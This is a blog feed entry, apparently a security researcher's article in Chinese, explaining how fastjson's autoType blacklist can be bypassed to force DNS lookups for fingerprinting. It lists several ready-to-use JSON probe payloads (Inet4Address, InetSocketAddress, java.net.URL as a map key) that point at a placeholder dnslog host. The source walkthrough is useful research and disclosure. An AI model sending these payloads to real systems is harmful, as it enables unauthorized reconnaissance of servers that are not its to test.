<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>回忆飘如雪</title>
  
  <subtitle>c0ny1&#39;s Blog-专注漏洞艺术</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://gv7.me/"/>
  <updated>2020-03-24T17:55:23.871Z</updated>
  <id>http://gv7.me/</id>
  
  <author>
    <name>c0ny1</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>通过dnslog探测fastjson的几种方法</title>
    <link href="http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/"/>
    <id>http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/</id>
    <published>2020-03-24T15:17:55.000Z</published>
    <updated>2020-03-24T17:55:23.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>在渗透测试中遇到json数据一般都会测试下有没有反序列化。然而json库有<code>fastjson</code>,<code>jackson</code>,<code>gson</code>等等。怎么判断后端不是fastjson呢？这就需要构造特定的payload了。</p><p>昨天翻看fastjson源码时发现了一些可以构造dns解析且没在黑名单当中的类，于是顺手给官方提了下<a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">Issue</a>。有趣的是后续的师傅们讨论还挺热闹的，我也在这次讨论中学习了很多。这篇文章算是对那些方法的汇总和原理分析。</p><p><img src="/articles/2020/several-ways-to-detect-fastjson-through-dnslog/1.png" alt="给fastjson官方提的issue"></p><h2 id="0x02-方法一-利用java-net-Inet-4-6-Address"><a href="#0x02-方法一-利用java-net-Inet-4-6-Address" class="headerlink" title="0x02  方法一:利用java.net.Inet[4|6]Address"></a>0x02  方法一:利用java.net.Inet[4|6]Address</h2><p>很早之前有一个方法是使用<code>java.net.InetAddress</code>类，现在这个类已经列入黑名单。然而在翻阅fastjson最新版源码(<code>v1.2.67</code>)时，发现两个类没有在黑名单中，于是可以构造了如下payload，即可使fastjson进行DNS解析。下面以<code>java.net.Inet4Address</code>为例分析构造原理。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"java.net.Inet4Address"</span>,<span class="attr">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"java.net.Inet6Address"</span>,<span class="attr">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br></pre></td></tr></table></figure><p>我们知道在fastjson在反序列化之前都会调用<code>checkAutoType</code>方法对类进行检查。通过调试发现，由于<code>java.net.Inet4Address</code>不在黑名单中，所以就算开启AutoType也是能过<code>1</code>处的检查。</p><p>fastjson的ParserConfig类自己维护了一个<code>IdentityHashMap</code>，在这个HashMap中的类会被认为是安全的。在<code>2</code>处可以在IdentityHashMap中可以获取到<code>java.net.Inet4Address</code>，所以<code>clazz</code>不为<code>null</code>，导致在<code>3</code>处就返回了。跳过了后续的未开启<code>AutoType</code>的黑名单检查。所以可以发现无论<code>AutoType</code>是否开启，都可以过<code>checkAutoType</code>的检查</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.parser.ParserConfig#checkAutoType</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">    ...</span><br><span class="line">    Class clazz;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.当打开了autoTypeSupport,类名又不在白名单时进行的黑名单检查</span></span><br><span class="line">    <span class="keyword">if</span> (!internalWhite &amp;&amp; (<span class="keyword">this</span>.autoTypeSupport || expectClassFlag)) &#123;</span><br><span class="line">        hash = h3;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">            hash ^= (<span class="keyword">long</span>)className.charAt(mask);</span><br><span class="line">            hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">            ....</span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span> &amp;&amp; Arrays.binarySearch(<span class="keyword">this</span>.acceptHashCodes, fullHash) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 2. fastjson的ParserConfig类自己维护了一个IdentityHashMap在这个HashMap中的类会被认为是安全的，会直接被返回。</span></span><br><span class="line">        clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = (Class)<span class="keyword">this</span>.typeMapping.get(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (internalWhite) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 直接返回，不再走下面的autoTypeSupport和黑名单检查</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 4. 不开启autoType时，进行的黑名单检查</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">            hash = h3;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = className.charAt(mask);</span><br><span class="line">                hash ^= (<span class="keyword">long</span>)c;</span><br><span class="line">                hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjason对于<code>Inet4Address</code>类会使用<code>MiscCodec</code>这个<code>ObjectDeserializer</code>来反序列化。跟进发现解析器会取出val字段的值赋值给strVal变量，由于我们的类是Inet4Address，所以代码会执行到1处，进行域名解析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.serializer.MiscCodec#deserialze</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        objVal = parser.parse();</span><br><span class="line"> ...</span><br><span class="line">        strVal = (String)objVal;</span><br><span class="line">        <span class="keyword">if</span> (strVal != <span class="keyword">null</span> &amp;&amp; strVal.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz == UUID.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URI.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URL.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == Pattern.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == Locale.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == SimpleDateFormat.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz != InetAddress.class &amp;&amp; clazz != Inet4Address.class &amp;&amp; clazz != Inet6Address.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 1. 将strVal作为主机名,获取其对应的ip，域名在此处被解析</span></span><br><span class="line">                    <span class="keyword">return</span> InetAddress.getByName(strVal);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnknownHostException var11) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"deserialize inet adress error"</span>, var11);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-方法二-利用java-net-InetSocketAddress"><a href="#0x03-方法二-利用java-net-InetSocketAddress" class="headerlink" title="0x03 方法二:利用java.net.InetSocketAddress"></a>0x03 方法二:利用java.net.InetSocketAddress</h2><p><code>java.net.InetSocketAddress</code>类也在<code>IdentityHashMap</code>中，和上面一样无视<code>checkAutoType</code>检查。</p><p>通过它要走到<code>InetAddress.getByName()</code>流程相比方法一是要绕一些路的。刚开始一直没构造出来，后来在和实验室的<code>@背影</code>师傅交流时，才知道可以顺着解析器规则构造（<code>它要啥就给它啥</code>），最终payload如下，当然它是畸形的json。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"java.net.InetSocketAddress"</span>&#123;<span class="attr">"address"</span>:,<span class="attr">"val"</span>:<span class="string">"dnslog"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>那这个是怎样构造出来的呢？这就需要简单了解下fastjson的词法分析器了，这里就不展开了。这里尤为关键的是解析器<code>token</code>值对应的含义，可以在<code>com.alibaba.fastjson.parser.JSONToken</code>类中看到它们。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.parser.JSONToken</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSONToken</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">name</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(value) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"int"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"float"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"string"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"iso8601"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"true"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"false"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"null"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"new"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"("</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">")"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&#123;"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&#125;"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"["</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"]"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">","</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">":"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"ident"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"fieldName"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"EOF"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Set"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"TreeSet"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">23</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"undefined"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">";"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"."</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">26</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hex"</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Unknown"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造这个payload需要分两步，第一步我们需要让代码执行到1处，这一路解析器要接收的字符在代码已经标好。按照顺序写就是<code>{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.serializer.MiscCodec#deserialze</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer;</span><br><span class="line">        String className;</span><br><span class="line">        <span class="keyword">if</span> (clazz == InetSocketAddress.class) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lexer.token() == <span class="number">8</span>) &#123;</span><br><span class="line">                lexer.nextToken();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 12 ---&gt; &#123;</span></span><br><span class="line">                parser.accept(<span class="number">12</span>);</span><br><span class="line">                InetAddress address = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">int</span> port = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                    className = lexer.stringVal();</span><br><span class="line">                    </span><br><span class="line">                    lexer.nextToken(<span class="number">17</span>);</span><br><span class="line">                    <span class="comment">// 字段名需要为address</span></span><br><span class="line">                    <span class="keyword">if</span> (className.equals(<span class="string">"address"</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 17 ---&gt; :</span></span><br><span class="line">                        parser.accept(<span class="number">17</span>);</span><br><span class="line">                        <span class="comment">// 1. 我们需要让解析器走到这里</span></span><br><span class="line">                        address = (InetAddress)parser.parseObject(InetAddress.class);</span><br><span class="line">                    &#125; </span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parser.parseObject(InetAddress.class)</code>最终依然会，调用<code>MiscCodec#deserialze()</code>方法来序列化，这里就来到我们构造payload的第二步。第二步的目标是要让解析器走到<code>InetAddress.getByName(strVal)</code>。解析器要接受的字符在代码里标好了，按照顺序写就是<code>,&quot;val&quot;:&quot;http://dnslog&quot;}</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.serializer.MiscCodec#deserialze</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer;</span><br><span class="line">        String className;</span><br><span class="line">        <span class="comment">// 序列化的是InetAddress.class类，走else流程</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == InetSocketAddress.class) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object objVal;</span><br><span class="line">            <span class="keyword">if</span> (parser.resolveStatus == <span class="number">2</span>) &#123;</span><br><span class="line">                parser.resolveStatus = <span class="number">0</span>;</span><br><span class="line">                <span class="comment">// 16 ---&gt; ,</span></span><br><span class="line">                parser.accept(<span class="number">16</span>);</span><br><span class="line">                <span class="keyword">if</span> (lexer.token() != <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 字段名 ---&gt; val</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                lexer.nextToken();</span><br><span class="line">                <span class="comment">// 17 ---&gt; :</span></span><br><span class="line">                parser.accept(<span class="number">17</span>);</span><br><span class="line">                <span class="comment">// 之后解析为对象,也就是val字段对应的值</span></span><br><span class="line">                objVal = parser.parse();</span><br><span class="line">                <span class="comment">// 13 ---&gt; &#125;</span></span><br><span class="line">                parser.accept(<span class="number">13</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            ....</span><br><span class="line">           <span class="comment">// 后续的流程和方法一一样了，进行类型判断</span></span><br><span class="line">           strVal = (String)objVal;</span><br><span class="line">           <span class="keyword">if</span> (strVal != <span class="keyword">null</span> &amp;&amp; strVal.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz == UUID.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URI.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URL.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz != InetAddress.class &amp;&amp; clazz != Inet4Address.class &amp;&amp; clazz != Inet6Address.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 域名解析</span></span><br><span class="line">                    <span class="keyword">return</span> InetAddress.getByName(strVal);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnknownHostException var11) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"deserialize inet adress error"</span>, var11);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两段合起来就得到了最终的payload。</p><h2 id="0x04-方法三-利用java-net-URL"><a href="#0x04-方法三-利用java-net-URL" class="headerlink" title="0x04 方法三:利用java.net.URL"></a>0x04 方法三:利用java.net.URL</h2><p><code>java.net.URL</code>类也在<code>IdentityHashMap</code>中，和上面一样无视<code>checkAutoType</code>检查。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;:"x"&#125;</span><br></pre></td></tr></table></figure><p>来源于<code>@retanoj</code>和<code>@threedr3am</code>两位师傅的启发,其原理和ysoserial中的<code>URLDNS</code>这个gadget原理一样。</p><p><strong>简单来说就是向HashMap压入一个键值对时，HashMap需要获取key对象的hashcode。当key对象是一个URL对象时，在获取它的<code>hashcode</code>期间会调用<code>getHostAddress</code>方法获取host，这个过程域名会被解析。</strong></p><p><img src="/articles/2020/several-ways-to-detect-fastjson-through-dnslog/2.png" alt="URL对象hashcode的获取过程"></p><p>fastjson解析上述payload时，先反序列化出<code>URL(http://dnslog)</code>对象，然后将<code>{URL(http://dnslog):&quot;x&quot;}</code>解析为一个HashMap,域名被解析。</p><p><code>@retanoj</code>在<a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">Issue</a>中还构造了好几个畸形的payload，虽然原理都是一样的,但还是挺有意思的,感受到了师傅对fastjson词法分析器透彻的理解。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"com.alibaba.fastjson.JSONObject", &#123;"@type": "java.net.URL", "val":"http://dnslog"&#125;&#125;""&#125;</span><br><span class="line">Set[&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;]</span><br><span class="line">Set[&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;</span><br><span class="line">&#123;&#123;"@type":"java.net.URL","val":"http://dnslog"&#125;:0</span><br></pre></td></tr></table></figure><h2 id="0x05-留一个问题"><a href="#0x05-留一个问题" class="headerlink" title="0x05 留一个问题"></a>0x05 留一个问题</h2><p>最后留个问题吧，我们都知道一般影响fastjson的gadget也会影响jackson。那么我们上面构造的payload，使用相同的原理能在jackson实现么？如果能，又该怎么构造呢？欢迎在blog留言区分享你的思考。</p><h2 id="0x06-参考文献"><a href="#0x06-参考文献" class="headerlink" title="0x06 参考文献"></a>0x06 参考文献</h2><ul><li><a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/issues/3077</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
